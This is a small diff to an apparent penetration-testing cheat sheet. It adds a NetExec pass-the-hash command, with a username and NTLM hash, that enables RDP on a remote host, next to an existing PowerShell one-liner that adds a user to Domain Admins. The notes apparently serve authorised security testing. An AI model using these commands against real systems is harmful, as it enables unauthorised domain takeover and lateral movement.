@@ -452,6 +452,12 @@ Custom command to add an user to the domain admin group for easy copy&pasting:
 powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
 ```
 
+# Enable RDP Remotely
+```
+Enable RDP Remotely:
+nxc smb 10.69.88.23 -u tom.brokaw -H 57ea5704cc760d493cd96f531d241f15 -M rdp -o ACTION=enable
+```
+
 
 
 
